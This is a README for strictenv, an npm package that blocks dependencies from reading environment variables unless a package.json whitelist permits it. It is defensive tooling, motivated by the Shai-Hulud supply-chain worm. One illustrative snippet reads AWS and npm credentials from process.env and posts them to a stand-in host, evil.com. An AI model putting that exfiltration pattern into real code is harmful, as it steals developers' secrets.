# strictenv

Stop npm packages from stealing your secrets.

## The Problem

The [Shai-Hulud worm](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem) compromised 500+ npm packages and stole $50M+ in crypto by reading `AWS_SECRET_ACCESS_KEY`, `NPM_TOKEN`, and other credentials straight from `process.env`.

**Any package in your node_modules can read any environment variable. There's no permission system.**

strictenv fixes this.

## Quickstart

```bash
npm install strictenv
```

```javascript
// At the very top of your entry point
require('strictenv').enableStrictEnv();
```

```json5
// package.json - whitelist what each package can access
{
  "environmentWhitelist": {
    "aws-sdk": {
      "allowed": ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_REGION"]
    },
    "dotenv": {
      "allowed": ["*"]
    }
  }
}
```

## What Happens

When a non-whitelisted package tries to read an env var:

```
strictenv: Unauthorized environment variable access!

  Package: "totally-legit-package"
  Attempted to read: "AWS_SECRET_ACCESS_KEY"
  Location: node_modules/totally-legit-package/index.js:47

To allow this access, add to your package.json:

  "environmentWhitelist": {
    "totally-legit-package": {
      "allowed": ["AWS_SECRET_ACCESS_KEY"]
    }
  }
```

## How This Stops Shai-Hulud

The attack worked by hiding credential-stealing code in postinstall scripts and runtime:

```javascript
// Inside compromised package
const aws = process.env.AWS_SECRET_ACCESS_KEY;  // Just works!
const npm = process.env.NPM_TOKEN;              // No restrictions!
fetch('https://evil.com/steal', { body: JSON.stringify({ aws, npm }) });
```

With strictenv enabled, that code throws immediately:

```
ERR_STRICTENV_UNAUTHORIZED: "compromised-pkg" cannot read "AWS_SECRET_ACCESS_KEY"
```

The malware never gets your credentials. Your app crashes loudly instead of silently leaking secrets.

## Config Options

```json
{
  "environmentWhitelist": {
    "axios": {
      "allowed": ["HTTP_PROXY", "HTTPS_PROXY"],
      "allowPeerDependencies": true
    }
  }
}
```

- `allowed`: Array of env var names, or `["*"]` for all
- `allowPeerDependencies`: Grant same permissions to the package's dependencies

## Example

See [examples/](./examples) for a working demo with a fake malicious package.

```bash
cd examples && node app.js
```

## License

MIT
